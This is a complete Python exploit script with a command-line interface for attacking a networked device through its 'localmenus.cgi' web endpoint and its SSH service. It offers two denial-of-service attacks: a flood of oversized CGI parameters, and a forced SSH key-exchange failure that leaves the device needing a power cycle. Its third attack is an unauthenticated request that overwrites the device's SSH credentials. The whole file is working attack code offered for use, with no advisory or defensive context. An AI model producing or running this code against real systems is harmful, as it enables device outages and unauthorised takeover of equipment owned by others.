#!/usr/bin/python

import sys
import getopt
import requests
import paramiko
import socket
import os


def main(argv):
    target = ""
    attack = ""
    username = ""
    password = ""
    divider = "============================================="

    help_text = '''
exploit.py -t/--target ip-address-of-target -a/--attack attack-type [-u/--user username -p/--password password]
%s
Example: exploit.py -t 192.168.1.200 -a 1
Example: exploit.py --target 192.168.1.200 --attack 3 --user bob --password villa
%s
Attack types:
1: DoS with automatic device reset
2: DoS without automatic device reset
3: Change SSH credentials of target device
''' % (divider, divider)

    if len(sys.argv) == 1:
        print(help_text)
        sys.exit(2)
    try:
        opts, args = getopt.getopt(argv, "ht:a:u:p:", ["help", "target=", "attack=", "user=", "password="])
    except getopt.GetoptError:
        print(help_text)
        sys.exit(2)
    for opt, arg in opts:
        if opt == "-h":
            print(help_text)
            sys.exit()
        elif opt in ("-t", "--target"):
            target = arg
        elif opt in ("-a", "--attack"):
            attack = arg
        elif opt in ("-u", "--user"):
            username = arg
        elif opt in ("-p", "--password"):
            password = arg

    if username != "" and password != "" and attack == "3":
        print("Starting SSH attack!")
        print(divider)
        print("Target: ", target, "\nAttack: ", attack, "\nUser: ", username, "\nPassword: ", password)
        finished = attack_ssh(target, username, password)
    elif attack == "1":
        print("Starting DoS reset attack!")
        print(divider)
        print("Target: ", target, "\nAttack: ", attack)
        finished = dos_one(target)
    elif attack == "2":
        print("Starting DoS non-reset attack!")
        print(divider)
        print("Target: ", target, "\nAttack: ", attack)
        finished = dos_two(target)

    print(divider)

    if finished == 1:
        print("DoS reset attack completed!")
    elif finished == 2:
        print("DoS non-reset attack completed!")
        print("Device must be power cycled to restore functionality.")
    elif finished == 3:
        tell = "SSH attack finished!\nTry to login using the supplied credentials %s:%s" % (username, password)
        connection_example = "ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 %s@%s" % (username, target)
        print(tell)
        print("You must specify the key exchange when connecting or the device will be DoS'd!")
        print(connection_example)
    elif finished == 0:
        print("Something strange happened. Attack likely unsuccessful.")
    sys.exit()


def dos_one(target):
    url = "http://%s/localmenus.cgi" % target
    data = "A"*46
    payload = {"func": "609", "data": data, "rphl": "1"}
    print("FIRING ZE MIZZLES!")
    for i in range(1000):
        try:
            r = requests.post(url=url, params=payload, timeout=5)
            if r.status_code != 200:
                print("Device doesn't appear to be functioning or web access is not enabled.")
                sys.exit()
        except requests.exceptions.RequestException:
            return 1

    return 0


def dos_two(target):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    try:
        sock.connect((target, 22))
    except OSError:
        print("Device doesn't appear to be functioning (already DoS'd?) or SSH is not enabled.")
        sys.exit()

    transport = paramiko.Transport(sock=sock, disabled_algorithms={"kex": ["diffie-hellman-group-exchange-sha1",
                                                                           "diffie-hellman-group14-sha1",
                                                                           "diffie-hellman-group1-sha1"]})

    fd = os.open("/dev/null", os.O_WRONLY)
    savefd = os.dup(2)
    os.dup2(fd, 2)

    try:
        transport.connect(username="notreal", password="notreal")
    except (paramiko.ssh_exception.SSHException, OSError, paramiko.SSHException):
        os.dup2(savefd, 2)
        return 2

    return 0


def attack_ssh(target, username, password):
    url = "http://%s/localmenus.cgi" % target
    payload_user = {"func": "403", "set": "401", "name1": username, "name2": username}
    payload_pass = {"func": "403", "set": "402", "pwd1": password, "pwd2": password}
    print("FIRING ZE MIZZLES!")
    try:
        r = requests.post(url=url, params=payload_user, timeout=5)
        if r.status_code != 200:
            print("Device doesn't appear to be functioning or web access is not enabled.")
            sys.exit()

        r = requests.post(url=url, params=payload_pass, timeout=5)
        if r.status_code != 200:
            print("Device doesn't appear to be functioning or web access is not enabled.")
            sys.exit()
    except requests.exceptions.RequestException:
        print("Device doesn't appear to be functioning or web access is not enabled.")
        sys.exit()

    return 3


if __name__ == "__main__":
    main(sys.argv[1:])